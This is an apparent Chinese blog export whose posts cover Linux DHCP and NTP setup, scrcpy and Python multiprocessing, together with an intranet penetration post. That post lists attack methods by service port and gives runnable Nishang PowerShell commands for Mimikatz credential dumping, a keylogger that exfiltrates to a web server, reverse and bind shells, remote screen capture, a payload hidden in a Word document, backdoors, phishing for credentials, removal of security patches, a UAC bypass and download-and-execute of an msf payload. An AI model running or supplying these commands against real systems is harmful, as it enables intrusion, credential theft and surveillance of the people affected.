\n#保存，重启\n  \n```\n\n###### 日常的维护  \n日志与状态查询  \n```bash\n#服务器地址租约结果（可查看分发详细信息）\ncat /var/lib/dhcp/dhcpd.leases\n#系统日志文件(客户端直接关机不会记录，release的时候会记录)\ntail -f /var/log/syslog\n#查看服务运行状态\nsystemctl status isc-dhcp-server.service\n#客户端来查看获得地址历史(客户端是Linux时)\nless /var/lib/dhcp/dhcpd.leases\n\n```\n\n\n\n​    \n\n\n\n\n## NTP服务 （网络时间协议）\n>时间都去哪了\n\n<img src=\"http://image.xpshuai.cn//20200308150835487_32007.png\"></img>\n\n**时间表准： ** \n\n- GMT：格林威治标准时间\n- UTC：世界协调时间\n- CST：China Standard Time UT+8:00\n\n<img src=\"http://image.xpshuai.cn/20200308153026228_153.png\"></img>\n\n#### NTP协议  \n<img src=\"http://image.xpshuai.cn/20200308154004613_29225.png\"></img>\n\n###### NTP客户端  \n- 客户端程序从时间服务器同步时间\n- 系统启动时自动同步时间\n- 网口激活时自动同步运行\n- 手动同步时间  \n\n```bash\n# 新版系统，查看客户端时间  \ntimedatectl  \n  \n# RTC时间：硬件时间  \n```\n新版系统使用`timesyncd`客户端同步时间  \n向这个域名请求：ntp.ubuntu.com  \n\n```bash\n\ntimedatectrl list-timezones   #列出所有时区  \ntimedatectrl set-timezone    #设置时区\ntimedatectrl set-time \"2019-10-01 18:18:18\" #设置系统时间  \n\ntimedatectl set-ntp true  #开始网络同步\nsystemctl status systemd-timesyncd.service  # 查看时间服务状态\n  \n# 硬件时间(RTC)与UTC时间同步\nsudo hwclock -w   # 将系统时间写入到RTC时间\nsudo hwlock -s     # 将硬件\nhwclock --set --date='2019-10-01 18:18:18'\n  \n# 配置文件\n/etc/systemd/timesyncd.conf\n```\n\n\n###### 一个过时的东西(ntpdate)  \n<img src=\"http://image.xpshuai.cn/20200308170606501_6440.png\"></img>\n新版本系统使用`timesyncd`替换`ntpd`的客户端功能\n一旦安装了ntpdate / ntp,   timedatectrl将被禁用\n\n\n###### ntpd -- 客户端+服务器  \n>把机器设置成时间服务器  \n```bash\n\napt install ntp  # 安装ntp服务\nsystemctl start ntp  # 启动服务(123端口就被打开了)\nsystemctl status ntp  # 查询服务状态\nsystemctl restart ntp  # 重启服务\n\n##配置文件（我也要跟上一级的时间服务器同步）\nvim /etc/ntp.conf\n#如果不使用官方的时间服务器，可以自己指定\nserver 1.1.1.1  \n#首选网络时间服务器不可用的时候，使用本机始终作为备用时间源\nfudge 127.127.1.1 startum 10  # 层级设置低点( startum 10, 这里设置为10层)\n```\n\n配置文件中，主要的时间服务器如下  \n<img src=\"http://image.xpshuai.cn/20200308171832987_9157.png\"></img>\n\n  \n\n###### 命令: ntpq -- ntp服务端的查询命令  \n```bash\nntpq -p     \n#命令执行结果详解如下图：  \n```\n<img src=\"http://image.xpshuai.cn/20200308172254102_12604.png\"></img>\n每行前面第一个字符含义：\n\n```\n空  表示无效主机  \nx   已不再使用\n-   已不再使用\n#   状态良好但为使用\n+   良好且优先使用\n*   首选主同步主机    （一般是startum层级最高的）\n```\n\n\n###### 其他命令  \n```bash\n#查看日期\ndate  \n#设置\ndate --set 1998-11-11  #手动设置日期（要通过 sudo timedatectl set-ntp 0 来关掉ntp）\ndate --set 21:21:21    #设置时间\n\ncat /etc/timezone      #查看时区\n  \n```\n\n\n\n","tags":["ubuntu"],"categories":["Linux"]},{"title":"内网渗透","url":"%2Fposts%2F27104%2F","content":"\n# 内网分类：\n\n- 带域环境的内网\n- 不带域环境的内网\n\n  \n# 一些端口\n\n### 文件共享服务端口渗透\n\n> 比如学校机房有专门用来下载文件的服务器\n\n#### ftp服务\n\n**FTP服务：** ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；\n**默认端口：**20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）\n\n###### 攻击方式：\n\n- 爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块；\n- 匿名访问：用户名：anonymous 密码：为空或任意邮箱\n\n#### Samba服务\n\n**Samba服务：**对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。\n默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）\n\n###### 攻击方式：\n\n- 爆破：弱口令（爆破工具采用hydra）hydra -l username -P\n- PassFile IP smb\n- 未授权访问：给予public用户高权限\n- 远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等\n\n#### LDAP协议\n\n**ldap：**轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。\n默认端口：389\n\n###### 攻击方式：\n\n- 注入攻击盲注 \n- 未授权访问\n- 爆破：弱口令\n\n\n\n### 远程连接服务端口渗透\n\n#### SSH服务\n\n**SSH服务：**  这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。\n**默认端口：**    22\n\n###### 攻击方式：\n\n- 爆破：\n- 弱口令\n- 漏洞：28退格漏洞、OpenSSL漏洞\n\n#### Telent服务\n\n**Telnet服务：**在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；\n**默认端口：**  23\n\n###### 攻击方式：\n\n- 爆破：弱口令\n- 嗅探：此种情况一般发生在局域网\n\n#### 远程桌面连接\n\n**远程桌面连接：**作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；\n**默认端口：**  3389\n\n###### 攻击方式：\n\n- 爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块)\n- Shift粘滞键后门：5次shift后门\n- 3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_...，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids）\n\n#### VNC服务\n\n**VNC服务:**    一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也\n**默认端口：**5900+桌面ID（5901；5902）\n\n###### 攻击方式：\n\n- 爆破：弱口令\n- 认证口令绕过：\n- 拒绝服务攻击：（CVE-2015-5239）\n- 权限提升：（CVE-2013-6886）\n\n#### 第三方软件\n\n... ... \n\n### Web应用服务端口渗透\n\n#### 1.中间件平台渗透\n\n```\nIIS Apache Nginx Weblogic tomcat Jboos Websphere等\n# 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF`\n```\n\n\n\n#### 2.WEB应用程序渗透\n\n- 已知CMS \n\n- 未知CMS \n\n- 常规漏洞测试\n\n  \n\n### 数据库服务端口渗透\n\n针对所有的\t数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。\n\n#### MySQL数据库\n\n**默认端口：** 3306\n\n###### 攻击方式：\n\n- 爆破：弱口令\n- 身份认证漏洞：CVE-2012-2122\n- 拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器\n- Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意\n\n#### MSSQL数据库\n\n**默认端口：**1433（Server 数据库服务）、1434（Monitor 数据库监控）\n\n###### 攻击方式：\n\n- 爆破：弱口令\n\n#### Oracle数据库\n\n**默认端口：**1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）\n\n###### 攻击方式：\n\n- 爆破：弱口令\n-  漏洞攻击\n\n#### PostgreSQL数据库\n\nPostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。\n**默认端口：** 5432\n\n###### 攻击方式：\n\n- 爆破弱口令：postgres postgres\n- 缓冲区溢出：CVE-2014-2669\n\n#### MongoDB数据库\n\nMongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考\n**默认端口：**  27017\n\n###### 攻击方式：\n\n- 爆破弱口令 \n\n- 未授权访问\n\n#### Redis数据库\n\nredis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。\n\nExp：https://yunpan.cn/cYjzHxawFpyVt 访问密码 e547\n**默认端口：**  6379\n\n###### 攻击方式：\n\n- 爆破弱口令 \n\n- 未授权访问+配合ssh key提权\n\n#### SysBase数据库\n\n**默认端口：**服务端口5000；监听端口4100；备份端口：4200\n\n###### 攻击方式：\n\n- 爆破：\n- 弱口令;\n- 命令注入\n\n#### DB2数据库\n\n**默认端口：**5000\n\n###### 攻击方式：\n\n- 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）\n\n  \n\n**总结一下：**对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！\n\n### 邮件服务端口渗透\n\n#### SMTP协议\n\nsmtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！\n**默认端口：**  25（smtp）、465（smtps）\n\n###### 攻击方式：\n\n- 爆破：弱口令\n\n- 未授权访问\n\n#### POP3协议\n\n**默认端口：** 109（POP2）、110（POP3）、995（POP3S）\n\n###### 攻击方式：\n\n- 爆破弱口令\n\n- 未授权访问\n\n#### IMAP协议\n\n**默认端口：**143（imap）、993（imaps）\n\n###### 攻击方式：\n\n- 爆破：弱口令\n\n- 配置不当\n\n\n\n### 网络常见协议端口渗透\n\n#### DNS服务\n\n**默认端口：** 53\n\n###### 攻击方式：\n\n- 区域传输漏洞\n\n#### DHCP服务\n\n**默认端口：**67&68、546（DHCP Failover做双机热备的）\n\n###### 攻击方式：\n\n- DHCP劫持\n\n#### SNMP协议\n\n**默认端口：** 161\n攻击方式:\n\n- 爆破弱口令\n\n------\n\n\n\n# Powershell框架\n\n> 推荐使用 NiShang\n\n> 参考文章：https://www.4hou.com/posts/E99ml\n\n> 下载地址: https://github.com/samratashok/nishang\n\n> 各种命令解析： https://www.explainshell.com\n\n#### 安装问题\n\nnishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级）\n\n- powershell ISE是一个编译器\n- powershell有很多渗透框架：\n- PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异\n\n> 实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要\n\n#### 目录结构：\n\n<img src=\"http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%9B%AE%E5%BD%95.png\"></img>\n\n#### 模块和功能介绍：\n\n<img src=\"http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%8A%9F%E8%83%BD.png\"></img>\n\n#### 演示：\n\n端口扫描 密码获取 键盘记录 反弹会话 口令爆破\n\n#### 实战应用：\n\n- 后续控制\n- 域渗透\n- 系统提权\n\n```pythn\n# 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`）\n\nImport-Module .nishang.psml\n\n# 载入模块  查看NiShang都有哪些模块\n\nGet-Command -Moudle nishang\n\n## 查看机器基本信息\n\nGet-Information\n\n# 把结果导出文件  Out-File\n\nGet-Information | Out-File res.txt\n\n\n# 检测是否为虚拟机\n\nCheck-VM\n\n\n## 获取密码\n\nInvoke-Minikatz\n#Dump出本机的凭证信息\nInvoke-Minikatz -DumpCerts\n#dump出远程的两台计算机的凭证信息\nInvoke-Minikatz -ComputerName @(\"computer1\", \"computer2\")\n#在远程的一台机器上运行Mimikatz 并执行 \"privilege::debug exit\"\nInvoke-Minikatz -Command \"privilege::debug exit\" -ComputerName@(\"computer1\")\n\n\n# Get-PassHashes 获取密码\n\n# 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump）\n\nGet-PassHashes\n\n\n# 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率\n\nGet-PassHints\n\n\n\n## 获取帮助参数  Get-Help\n\nGet-Help Invoke-PortScan\n\n\n## 端口扫描\n\n查看帮助信息\nGet-Help Invoke-PortScan -full\nInvoke-PortScan\nInvoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost \n\n\n\n# cd 切换到对应目录\n\n## 测试键盘记录:  \n\nGet-Help .\\Keylogger.ps1 --full   # 查看帮助（提供了四种方式记录）\n#-URL 要把记录发Keylogger送到的置顶的远程服务器    ,    -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录\n.\\gather\\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php \n\n# 解释： 将记录指定发送给一个可以记录Post请求的Web服务器\n\n# 默认保存到(内容是ascii码)： Windows/Temp/key.log\n\n# 把ascii记录解析为非ascii：\n\nParse_Keys .\\key.log .\\parsed.txt\n\n# 持久化记录（重启之后也记录）\n\n.\\Keylogger.ps1 -persist\n\n\n\n## 爆破口令  在scan目录下面\n\n#用于对SQL Server、域控制器、Web和FTP弱口令爆破\nInvoke-BruteForce\n#命令参数如下\n-ComputerName    # 对应服务的计算机名\n-UserList  用户名字典\n-PasswordList  密码字典\n-Service 服务（默认为：SQL）\n-StopOnSuccess   匹配一个后停止\n-Delay    延迟时间\n#比如\nInvoke-BruteForce -ComputerName  xx-PC  -UserList user.txt  -PasswordList pass.txt  -Service ActiveDirectory  -Verbose\n\n\n# 内网扫描器\n\n# 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener\n\n#1.在本机开启监听\nFireListener 130-150\n#2.在目标机器输入命令：\nFireListener 192.168.0.107 130-150 -Verbose\n\n\n## 内网嗅探\n\n动静很大，实在没有办法的时候可以试试\n目标机执行以下命令\nInvoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999\n本机监听\nnc -lvvp 9999\n\n\n\n## 屏幕窃取   Show-TargetScreen\n\n#本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可）\nShow-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443   # 将远程的画面传输给 192.168.230.1 的443端口\n参数： Bind --> 正向连接\n\n在目标机执行以下命令（反向连接）\nShow-TargetScreen  -IPAddress 192.168.230.172 -Port 3333\n本机输入以下命令 ，接着访问本机的9999端口\nnc -nlvp 3333 | nc -nlvp 9999\n\n\n正向连接\n目标机执行：\nShow-TargetScreen -Bind -Port 3333\n本机执行：\nnc -nv 192.168.230.37 3333 | nc -lnvp 9999\n\n\n\n\n\n## Client 的生成(类似木马)\n\n需要自己绑定payload\n首先在本机监听：\nnc -lvp 4444\n接着制作word文件，打开\\nishang\\Shell\\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行\nInvoke-Encode -DataToEncode '复制的代码' -IsString -PostScript\n执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt\n接着执行命令\nOut-Word-PayloadScript .\\encodedcommand.txt\n会生成一个word文档，用户打开就中招，我们获取到反弹的powershell\n\n\n\n##  后门\n\n1.Http-Backdoor\n可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本\n\n2.Add-ScrnSaveBackdoor\n利用windows的屏保来留下一个隐藏的后门\n\n3.Execute-OnTime\n与Http-Backdoor相比，多了定时功能\n\n4.Invoke-ADSBackdoor\n使用NTFS数据流留下的一个永久后门\n最恐怖的后门\n\n\n\n\n\n## 钓鱼攻击(有道用户输入自己机器的密码)\n\nInvoke-CredentialsPhish\n\n\n## webshell后门   位于 \\nishang\\Antak-WebShell目录下\n\n就是一个asp的大马（使用的是powershell的命令，比cmd命令强大）\n\n\n\n# 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来）\n\nCopy-VSS    # 直接把文件保存在当前路径下\nCopy-VSS -DEstinationDir C:temp    # 制定文件保存路径（必须是已存在的路径）\n\n## 其他......\n```\n\n\n\n###### 后续控制\n\n```python\n# windows上没有nc，需要提前上传一个nc.exe，推荐Linux\n\n## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip）  在Shells目录下面\n\n#1.攻击机器上 NC下执行: \nnc -lvp 3333\n#2.在目标服务器 PowerShell下执行：  TCO的\nInvoke-PowerShellTcp -Reverse -IPAddress 192.168.0.103 -Port 3333\n\n\n\n## NO2.正向连接:\n\n#1.目标 PowerShell下执行:  TCP的，  另外还有UDP的: \nInvoke-PowerShellTcp -Bind -Port 3333\n#NC下执行: 请求他的3333端口\nnc -nv 192.168.0.103 3333\n\n\n### 基于UDP( Invoke-PowerShellUdp )，  nc命令有点不同\n\n正向连接\nnc -nvu 192.168.0.103 3333\n反向连接\nnc lup 3333\n\n### 基于http和https  （ Invoke-PoshRatHttp ）\n\n### 此外,还有http的shell(执行完会生成一条命令，然后???)\n\nInvoke-PoshRatHttp -Reverse -IPAddress 192.168.0.103 -Port 3333\nInvoke-PoshRatHttps -Reverse -IPAddress 192.168.0.103 -Port 3333\n\n# 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话\n\n\n```\n\n\n\n###### 域渗透\n\n在nishang目录下面的ActiveDirectory下面\n\n**疑难杂症**\n1.真实案例分析\n\n```python\n\n```\n\n\n\n2.各种安全限制\n\n```python\n无解析\n\n无权限\n\n无执行\n```\n\n\n\n###### 系统提权\n\n- 基于数据库\n- 基于漏洞（常用，如果电脑没补丁，可以删除补丁）\n- 第三方软件\n\n```python\n# 查看系统的补丁\nsysteminfo\n\n# 删除补丁\nRemove-Update   # 然后输入补丁编号\n\n# 删除全部补丁\nRemove-Update All\n\n# 删除全部的安全补丁\nRemove-Update Security\n\n# 删除指定的补丁\nRemove-Update KB2761226\n\n\n\n#### Bypass  UAC    :   模块:Invoke-PsUACme\nUAC (用户账户控制)\nGet-Help  获取帮助\n\n```\n\n\n\n###### powershell下载文件(nishang)\n\n```python\n$client = new-object System.Net.WebClient\n$client.DownloadFile('#1', '#2')\n#1是需要下载文件的url\n#2是保存为本地文件的路径，包括文件名\n例如：\n$client.DownloadFile('https://www.2cto.com/net/201611/562900.html', 'D:/562900.html')\n\n\n# 或者这个方法\n\n$src = 'https://www.pstips.net/index.php'\n$des = \"$env:temp\\index.php\"\nInvoke-WebRequest -uri $src -OutFile $des\nUnblock-File $des\n\n\n# 下载完之后就可以用啦\n\n\n## 下载执行       Download_Execute\n\n下载文本文件，然后转换为可执行文件执行\n\n利用exetotext.ps1把msf生成的木马端`msf.exe`更改为`msf.txt`文件\nExetoTxt c:msf.exe  c:msf.txt\n\n然后输入以下命令，调用`Download Execute`脚本下载并执行该文件\nDownload Execute http://192.168.110.128/msf.txt\n\n这时，msf的监听端就会成功获得反弹回来的shell\n```\n\n\n\n> powershell是没有杀毒软件提示的","tags":["渗透"],"categories":["渗透测试"]},{"title":"scrcpy-手机与电脑投屏神器","url":"%2Fposts%2F50980%2F","content":"  \n  \n  \n#### scrcpy 安装\n\n```\nsnap install scrcpy\n```\n\n#### adb服务安装\n  \n```\nsudo apt-get install android-tools-adb\n```\n\n#### adb配置\n  \n###### 手机通过USB连接电脑\n\n```\nlsusb\n```\n\n找到自己手机的识别号,(可以对比数据线插入之前和插入之后多了哪个就是哪个)\n\n###### 创建设备文件\n\n下面所有的`04e8`改成自己的识别号, `android.rules`文件名可自定义\n\n```bash\nmkdir ~/.android\n# 注意你的设备号\necho 0x04e8 > ~/.android/adb_usb.ini\nsudo touch /etc/udev/rules.d/android.rules\nsudo gedit /etc/udev/rules.d/android.rules\n\n```\n\n###### 在文件中输入:\n\n注意自己的设备号\n\n```\nSUBSYSTEM==\"usb\", SYSFS{idVendor}==\"你的设备号\", MODE=\"0666\"\n```\n\n###### 保存后修改文件权限\n\n```bash\nsudo chmod 777 /etc/udev/rules.d/android.rules\n```\n\n###### 启动adb服务\n\n```bash\nservice udev restart\nadb start-server\nadb devices\n```\n\n有设备就说明成功了, 如果没有看看自己手机的开发者模式以及USB调试有没有打开\n\n\n\n#### **使用scrcpy**\n\n命令行输入\n\n```python\n# 直接使用\nscrcpy\n# 设置显示尺寸为1080\nnohun scrcpy -m 1080 &  \n```\n\n就会弹出界面了\n\n\n\n###### scrcpy使用方法\n\n```python\n\"\"\"\n鼠标左键点击、滑动;\n长按鼠标中键回到主屏幕;Ctrl+Shift+V\n鼠标右键返回复制文本电脑到手机:  电脑上复制后, 在手机投屏界面按Ctrl+Shift+V复制到手机剪切板, 然后手机中粘贴手机到电脑: 手机上复制到剪切板中, 在投屏界面按下Ctrl+C键，再到电脑正常上粘贴传输文件: 直接在文件管理器复制粘贴\n\n\"\"\"\n```\n\n\n\n#### 快捷键\n\n###### 全屏/回到合适尺寸\n\n`ctrl +f`    `ctrl + x`\n\n\n\n###### 展开/折叠通知栏\n\n`ctrl +n`   `ctrl + shift + n`\n\n\n\n#### 结束投屏\n\n`scrcpy -S`\n\n或者关掉显示窗口即可\n\n---\n\n#### Scrcpy 的命令参数\n\n|                             |                                                              |\n| --------------------------- | ------------------------------------------------------------ |\n| **关闭手机屏幕**            | `scrcpy -S`                                                  |\n| **限制画面分辨率**          | `scrcpy -m 1024` (比如限制为 1024)                           |\n| **修改视频码率**            | `scrcpy -b 4M` (默认 8Mbps，改成 4Mbps)                      |\n| **裁剪画面**                | `scrcpy -c 1224:1440:0:0` 表示分辨率 1224x1440 并且偏移坐标为 (0,0) |\n| **多设备切换**              | `scrcpy -s 设备ID` (使用 `adb devices` 命令查看设备ID)       |\n| **窗口置顶**                | `scrcpy -T`                                                  |\n| **显示触摸点击**            | `scrcpy -t` 在演示或录制教程时，可在画面上对应显示出点击动作 |\n| **全屏显示**                | `scrcpy -f`                                                  |\n| **文件传输默认路径**        | `scrcpy --push-target /你的/目录` 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录 |\n| **只读模式(仅显示不控制)**  | `scrcpy -n`                                                  |\n| **屏幕录像**                | `scrcpy -r 视频文件名.mp4` 或 `.mkv`                         |\n| **屏幕录像 (禁用电脑显示)** | `scrcpy -Nr 文件名.mkv`                                      |\n| **设置窗口标题**            | `scrcpy --window-title '异次元好棒！'`                       |\n| **同步传输声音**            | 可借助 [USBaudio](https://github.com/rom1v/usbaudio) 这个开源项目实现，但仅支持 [Linux](https://www.iplaysoft.com/os/linux-platform) 系统 |\n\n\n\n#### Scrcpy 快捷键列表\n\n|                                |                            |\n| ------------------------------ | -------------------------- |\n| 切换全屏模式                   | `Ctrl`+`F`                 |\n| 将窗口调整为1：1（完美像素）   | `Ctrl`+`G`                 |\n| 调整窗口大小以删除黑色边框     | `Ctrl`+`X` \\| 双击黑色背景 |\n| 设备 `HOME` 键                 | `Ctrl`+`H` \\| 鼠标中键     |\n| 设备 `BACK` 键                 | `Ctrl`+`B` \\| 鼠标右键     |\n| 设备 `任务管理` 键 (切换APP)   | `Ctrl`+`S`                 |\n| 设备 `菜单` 键                 | `Ctrl`+`M`                 |\n| 设备`音量+`键                  | `Ctrl`+`↑`                 |\n| 设备`音量-`键                  | `Ctrl`+`↓`                 |\n| 设备`电源键`                   | `Ctrl`+`P`                 |\n| 点亮手机屏幕                   | 鼠标右键                   |\n| 复制内容到设备                 | `Ctrl`+`V`                 |\n| 启用/禁用 FPS 计数器（stdout） | `Ctrl`+`i`                 |\n| 安装APK                        | 将 apk 文件拖入投屏        |\n| 传输文件到设备                 | 将文件拖入投屏（非apk）    |\n\n\n\n- **投屏并录屏：**`scrcpy -r file.mp4`\n- **不投屏只录屏：**`scrcpy -Nr file.mp4`\n\n\n\n###### 录制声音\n\n结合：https://github.com/rom1v/usbaudio\n\n","tags":["scrcpy"],"categories":["工具"]},{"title":"python-进程","url":"%2Fposts%2F58862%2F","content":"\n\n  \n**并发：**   任务数大于cpu个数\n\n**并行：**    cpu个数和任务数相同\n\n\n\n**GIL 锁:**   任何python进程中，一次永远只有一个线程运行\n\n一个python进程  只能执行一个线程\n\n\n\n###### 创建进程\n\n```python\n## 不同操作系统创建进程的区别：\n\n#linux上:   fork() \nimport os\nimport time\n\npid = os.fork() # 这个地方会创建一个子进程， 他的pid号值永远为0\nif pid == 0:\n    print(\"我是子进程\")\n    time.sleep(3)\nelse:\n    print(\"我是父进程\")\n    time.sleep(3)\n\n\n\n\n# win上创建进程 类似于导入机制   都通用的\nimport multiprocessing\n\ndef func():\n    print(\"000\")\n\nif __name__ == '__main__':\n    p = multiprocessing.Process(target=func)  # 生成进程, 传参target= ，args=\n    p.start()       # 开启进程， 相当于一个子进程\n\n\n\n```\n\n\n\n\n\n\n\n###### 进程标识\n\n```python\n# 进程标识  pid\n\nimport time\nimport os\nimport multiprocessing\n\ndef func():\n    time.sleep(5)\n\nif __name__ == \"__main__\":\n    print(\"main pid \", os.getpid())   # 当前进程的\n\tprint(multiprocessing.current_process().pid)\n    p = multiprocessing.Process(target=func)\n    print(p.pid)\n    p.start()     # start之后才有pid号\n    print(p.pid)\n    time.sleep(10)\n# 线程的标识是 ident\n\n\n# 操作系统调用的是进程\n\"\"\"\n注意！\n操作系统并不能看到线程的标识。\n因为，线程是由Python解释器\n来负责调度的。\n\n操作系统仅需要调度进程就行了\n\"\"\"\n```\n\n\n\n###### 守护进程\n\n```python\n# 守护进程  daemon = True  主进程结束之后，子进程跟着结束（某子进程的生命周期随着主进程）\nimport time\nimport multiprocessing\n\ndef func():\n    time.sleep(20)\n    print(\"子进程结束\")\n\nif __name__ == \"__main__\":\n    p = multiprocessing.Process(target=func, daemon = True)\n    p.daemon = True   # 设置成守护进程 p True会随着主进程结束而结束， 主进程不会等待子进程结束\n    p.start()\n    time.sleep(3)\n\n```\n\n\n\n###### 终止进程\n\n```python\n# 终止进程\nimport multiprocessing\nimport time\n\ndef func():\n    time.sleep(5)\n    print(multiprocessing.current_process())\n\n\nif __name__ == \"__main__\":\n    p = multiprocessing.Process(target=func)\n    p.start()\n    time.sleep(2) # 主进程2s\n    p.terminate()   # 结束,主进程结束，不管子进程有没有结束，就终止子进程（线程没有这个）\n\n\n```\n\n\n\n###### 面向对象\n\n```python\n# 面向对象 类继承创建进程\n# start() --> run(已经是在新的进程了) --> target   # target是由默认的run运行\nimport multiprocessing\nimport time\n\nclass My_Process(multiprocessing.Process):\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(args, kwargs)\n        print(\"初始化...\")\n\n    def run(self):\n        \"\"\"\n        start 默认调用的方法   重写啦在这里\n        :return:\n        \"\"\"\n        print(\"run...\")\n        self.task()\n        time.sleep(5)\n\n    def task(self):\n        print(\"task...\")\n\n\nif __name__ == \"__main__\":\n    p = My_Process()\n    p.start()   # start 方法会调用run\n\n# 创建进程的方式 ： multiprocessing.Process     类继承，重写run     linux下：fork\n# 如果换成是线程的话：换掉继承类就行\n\n```\n\n\n\n###### 进程通信\n\n```python\n# -*- coding:utf-8 -*-\n\nimport multiprocessing\nfrom multiprocessing import Manager  # 管理器\n\n\ndef func(l):\n    l.append(111)\n\nif __name__ == '__main__':\n    manager = Manager()  # 实例化  先开启一个公共进程，并返回一个管理器\n    l = manager.list()   # 开启空间，左边就是代理\n    # l = manager.dict()\n    \"\"\"\n    一般常用的空间类型是：\n    1.  mgr.list()\n    2.  mgr.dict()\n    3.  mgr.Queue()\n    \"\"\"\n    print(l)\n    p = multiprocessing.Process(target=func, args=(l,))\n    p.start()\n    p.join()\n    print(l)   # 这样使用manager之后 l就是【共享】的了\n    \n```\n\n\n\n进程池 & 线程池\n\nps:有点乱\n\n```python\n# from multiprocessing import Pool   # 进程池\nfrom multiprocessing.dummy import Pool  #线程池\nfrom multiprocessing.pool import ThreadPool # 线程池\nimport threading\nimport time\n\n\ndef func(i):\n    print(\"{}-------555\".format(i))\n    time.sleep(2)\n    return i\n\ndef print_back(*args, **kwargs):\n    print(\"处理数据完成\",args, kwargs)\n\npool = Pool(6)   # 不写的话 默认是cpu的个数\n# print(threading.active_count())\n\nfor i in range(5):\n    pool.apply_async(func=func, args=(i,), callback=print_back)  ## 添加任务   不阻塞    主要使用的方法\n#     pool.apply(func=func, )  ## 添加任务   阻塞\n# pool.map(func, [i for i in range(5)])   #添加任务  不阻塞\n\npool.close()   #关闭线程池  不在提交新的任务\npool.join()    